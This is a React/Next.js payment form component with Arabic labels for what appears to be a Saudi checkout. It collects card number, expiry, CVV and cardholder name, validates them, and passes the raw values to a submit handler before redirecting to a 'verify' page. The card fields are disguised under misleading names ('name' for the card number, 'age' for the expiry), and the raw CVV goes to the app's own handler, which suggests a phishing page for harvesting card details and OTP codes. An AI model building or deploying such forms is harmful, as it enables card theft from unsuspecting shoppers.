"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import creditCardType from "credit-card-type";

interface RateLimitError {
  code: string;
  retryAfter: number;
}

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<RateLimitError | void>;
}

const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

type CardBrand = "visa" | "mastercard" | "mada" | null;

function detectCard(num: string): CardBrand {
  const raw = num.replace(/\s/g, "");
  if (raw.length >= 6 && MADA_BINS.includes(raw.slice(0, 6))) return "mada";
  if (raw.length < 2) return null;
  const types = creditCardType(raw);
  if (!types.length) return null;
  const t = types[0].type;
  if (t === "visa") return "visa";
  if (t === "mastercard") return "mastercard";
  return null;
}

function CardLogo({ brand, width = 48, className = "" }: { brand: string; width?: number; className?: string }) {
  if (brand === "visa") return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" width={width} className={className}>
      <path d="M278.2 334.2h-60.5l37.8-233.9h60.5z" fill="#00579f"/>
      <path d="M524.3 105.6c-12-4.5-30.7-9.3-54.1-9.3-59.6 0-101.6 31.7-101.9 77.1-.4 33.6 30 52.3 52.8 63.5 23.5 11.5 31.4 18.8 31.3 29.1-.2 15.7-18.8 22.9-36.1 22.9-24.1 0-36.9-3.5-56.7-12.2l-7.8-3.7-8.4 52.2c14.1 6.5 40.1 12.1 67.1 12.4 63.4 0 104.6-31.3 105.1-79.8.3-26.6-15.9-46.8-50.8-63.5-21.1-10.8-34.1-18-33.9-29 0-9.7 10.9-20.1 34.6-20.1 19.7-.3 34 4.2 45.1 9l5.4 2.7 8.3-51.3z" fill="#00579f"/>
      <path d="M661.6 100.3h-46.6c-14.4 0-25.2 4.2-31.5 19.3L487.8 334.2h63.4s10.4-28.8 12.7-35.1h77.4c1.8 8.2 7.3 35.1 7.3 35.1H702L661.6 100.3zm-74.6 182c5-13.5 24.2-65.6 24.2-65.6-.4.6 5-13.6 8.1-22.5l4.1 20.3s11.6 56.2 14.1 67.8h-50.5z" fill="#00579f"/>
      <path d="M232.8 100.3L173.6 261l-6.4-32.5c-11-37.4-45.3-78-83.7-98.3l54.1 204h63.8l95-234h-63.6z" fill="#00579f"/>
      <path d="M120.4 100.3H24.2L23 105.6c75.6 19.3 125.6 65.9 146.4 121.9L147.7 120c-3.7-14.8-14.4-19.3-27.3-19.7z" fill="#faa61a"/>
    </svg>
  );
  if (brand === "mastercard") return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" width={width} className={className}>
      <circle cx="268" cy="235.5" r="150" fill="#eb001b"/>
      <circle cx="482" cy="235.5" r="150" fill="#f79e1b"/>
      <path d="M375 119.7c38.5 31.2 63.1 78.7 63.1 131.8s-24.6 100.6-63.1 131.8c-38.5-31.2-63.1-78.7-63.1-131.8s24.6-100.6 63.1-131.8z" fill="#ff5f00"/>
    </svg>
  );
  if (brand === "mada") return <Image src="/mada975b.png" alt="Mada" width={width} height={Math.round(width * 0.6)} className={`object-contain ${className}`} />;
  return null;
}

function luhnCheck(num: string) {
  let sum = 0, shouldDouble = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function fmt(s: number) {
  return `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);
  const [rateLimitError, setRateLimitError] = useState<RateLimitError | null>(null);
  const [countdown, setCountdown] = useState(0);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, []);

  const startCountdown = (err: RateLimitError) => {
    if (timerRef.current) clearInterval(timerRef.current);
    setRateLimitError(err);
    setCountdown(err.retryAfter);
    timerRef.current = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setRateLimitError(null);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const rawCard = fields.name.replace(/\s/g, "");
  const cardBrand = detectCard(fields.name);

  const handleNext = async () => {
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("رقم البطاقة غير صحيح"); return; }
    if (!cardBrand) { setCardError("نوع البطاقة غير مدعوم"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]), expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("صيغة غير صحيحة (MM/YY)"); return; }
    if (expMonth < 1 || expMonth > 12) { setExpiryError("الشهر بين 01 و 12"); return; }
    if (new Date(2000 + expYear, expMonth - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setExpiryError("البطاقة منتهية الصلاحية"); return; }
    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("تاريخ غير صحيح"); return; }
    setExpiryError("");
    setLoading(true);
    try {
      const result = await onSubmit(fields);
      if (result && "code" in result) {
        startCountdown(result);
        return;
      }
      router.push("/checkout/verify");
    } finally {
      setLoading(false);
    }
  };

  const inputBase = "w-full rounded-xl px-4 py-3 text-sm focus:outline-none transition";
  const getStyle = (hasError: boolean) => ({
    backgroundColor: "#faf7f2",
    border: hasError ? "1.5px solid #ef4444" : "1.5px solid rgba(188,146,85,0.2)",
    color: "#0A1825",
  });

  const displayNumber = fields.name ? fields.name.padEnd(19, " ").slice(0, 19) : "0000 0000 0000 0000";

  const cardBg = cardBrand === "mada"
    ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
    : cardBrand === "mastercard"
    ? "linear-gradient(135deg, #1a1a2e 0%, #2d132c 100%)"
    : "linear-gradient(135deg, #0A1825 0%, #132d44 100%)";

  return (
    <>
      {/* ── Visual Card ── */}
      <div className="w-full max-w-sm mx-auto mb-6" style={{ perspective: "1000px", minHeight: "185px" }}>
        <div style={{ transition: "transform 0.6s", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", position: "relative", minHeight: "185px" }}>
          {/* Front */}
          <div className="absolute inset-0 rounded-2xl p-5 text-white select-none" style={{ background: cardBg, boxShadow: "0 12px 40px rgba(10,24,37,0.2)", backfaceVisibility: "hidden" }}>
            <div className="flex justify-between items-start mb-6">
              <div className="w-10 h-7 rounded-md" style={{ background: "linear-gradient(135deg, #BC9255, #f5e06e, #BC9255)" }} />
              <div className="h-7 flex items-center">
                {cardBrand ? <CardLogo brand={cardBrand} width={48} className="brightness-0 invert" /> : <span className="text-xs text-white/40">CARD</span>}
              </div>
            </div>
            <div className="font-mono text-lg sm:text-xl tracking-widest mb-5 text-center" dir="ltr">{displayNumber}</div>
            <div className="flex justify-between items-end">
              <div>
                <p className="text-[10px] opacity-50 mb-0.5">CARD HOLDER</p>
                <p className="text-xs sm:text-sm font-semibold tracking-wider uppercase truncate max-w-[160px]">{fields.cardHolder || "FULL NAME"}</p>
              </div>
              <div className="text-right">
                <p className="text-[10px] opacity-50 mb-0.5">EXPIRES</p>
                <p className="text-xs sm:text-sm font-semibold">{fields.age || "MM/YY"}</p>
              </div>
            </div>
          </div>
          {/* Back */}
          <div className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 12px 40px rgba(10,24,37,0.2)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
            <div className="w-full h-10 mt-6" style={{ background: "#1a1a1a" }} />
            <div className="px-5 mt-4">
              <p className="text-[10px] opacity-50 mb-1 text-right">CVV</p>
              <div className="bg-white rounded px-3 py-2 text-gray-800 font-mono tracking-widest text-right text-sm">{fields.cvv || "•••"}</div>
            </div>
          </div>
        </div>
      </div>

      {/* ── Form ── */}
      <div className="rounded-2xl overflow-hidden" style={{ backgroundColor: "#fff", border: "1px solid rgba(188,146,85,0.12)" }}>
        {/* Accepted cards */}
        <div className="flex items-center gap-3 px-4 py-2.5" style={{ backgroundColor: "#faf7f2", borderBottom: "1px solid rgba(188,146,85,0.1)" }}>
          <span className="text-[11px] font-medium" style={{ color: "#A77D4B" }}>نقبل:</span>
          <CardLogo brand="mada" width={36} />
          <CardLogo brand="visa" width={36} />
          <CardLogo brand="mastercard" width={36} />
        </div>

        <div className="p-4 sm:p-5 space-y-4">
          {/* Card Number */}
          <div>
            <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
              رقم البطاقة <span className="text-red-400">*</span>
            </label>
            <div className="relative">
              <input
                autoComplete="cc-number"
                type="text"
                inputMode="numeric"
                pattern="[0-9 ]*"
                placeholder="0000 0000 0000 0000"
                maxLength={19}
                dir="ltr"
                value={fields.name}
                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab|Home|End/.test(e.key) && !e.ctrlKey && !e.metaKey) e.preventDefault(); }}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${inputBase} pl-14 text-right`}
                style={getStyle(!!(cardError || (errors && !fields.name)))}
              />
              <div className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none">
                {cardBrand ? <CardLogo brand={cardBrand} width={34} /> : <span className="text-[9px]" style={{ color: "#A77D4B" }}>CARD</span>}
              </div>
            </div>
            {cardError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cardError}</p>}
          </div>

          {/* Expiry + CVV */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
                تاريخ الانتهاء <span className="text-red-400">*</span>
              </label>
              <input
                autoComplete="cc-exp"
                type="text"
                inputMode="numeric"
                pattern="[0-9\/]*"
                placeholder="MM/YY"
                maxLength={5}
                value={fields.age}
                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab|Home|End/.test(e.key) && !e.ctrlKey && !e.metaKey) e.preventDefault(); }}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "");
                  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                  setFields(f => ({ ...f, age: v }));
                  setExpiryError("");
                }}
                className={`${inputBase} text-center`}
                style={getStyle(!!(expiryError || (errors && !fields.age)))}
              />
              {expiryError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {expiryError}</p>}
            </div>
            <div>
              <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
                CVV <span className="text-red-400">*</span>
              </label>
              <input
                autoComplete="cc-csc"
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="000"
                maxLength={3}
                value={fields.cvv}
                onFocus={() => setFlipped(true)}
                onBlur={() => setFlipped(false)}
                onKeyDown={e => { if (!/[0-9]|Backspace|Delete|ArrowLeft|ArrowRight|Tab|Home|End/.test(e.key) && !e.ctrlKey && !e.metaKey) e.preventDefault(); }}
                onChange={e => {
                  const v = e.target.value.replace(/\D/g, "").slice(0, 3);
                  setFields(f => ({ ...f, cvv: v }));
                  setCvvError("");
                }}
                className={`${inputBase} text-center`}
                style={getStyle(!!(cvvError || (errors && !fields.cvv)))}
              />
              {cvvError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cvvError}</p>}
            </div>
          </div>

          {/* Card Holder */}
          <div>
            <label className="block text-xs font-bold mb-1.5" style={{ color: "#0A1825" }}>
              اسم حامل البطاقة <span className="text-red-400">*</span>
            </label>
            <input
              autoComplete="cc-name"
              type="text"
              placeholder="FULL NAME"
              value={fields.cardHolder}
              onChange={e => {
                const v = e.target.value.replace(/[^a-zA-Z ]/g, "");
                setFields(f => ({ ...f, cardHolder: v.toUpperCase() }));
              }}
              className={inputBase}
              style={getStyle(!!(errors && !fields.cardHolder))}
              dir="ltr"
            />
          </div>

          {/* Rate Limit Banner */}
          {rateLimitError && (
            <div className="rounded-xl px-4 py-3 text-sm font-bold text-center" style={{ backgroundColor: "rgba(239,68,68,0.08)", border: "1.5px solid rgba(239,68,68,0.3)", color: "#dc2626" }}>
              لقد تجاوزت الحد المسموح من الطلبات. يرجى الانتظار {fmt(countdown)} قبل المحاولة مرة أخرى.
            </div>
          )}
        </div>
      </div>

      {/* ── Actions ── */}
      <div className="flex gap-3 mt-5">
        <button
          onClick={() => router.push("/payment-method")}
          className="flex-1 py-3.5 rounded-xl text-sm font-bold transition hover:opacity-80"
          style={{ backgroundColor: "rgba(188,146,85,0.08)", color: "#A77D4B", border: "1px solid rgba(188,146,85,0.2)" }}
        >
          السابق
        </button>
        <button
          onClick={handleNext}
          disabled={loading || !!rateLimitError}
          className="flex-1 py-3.5 rounded-xl font-bold text-sm transition hover:opacity-90 active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
          style={{ backgroundColor: "#BC9255", color: "#fff" }}
        >
          {loading ? "جاري المعالجة..." : "تأكيد الدفع"}
        </button>
      </div>
    </>
  );
}
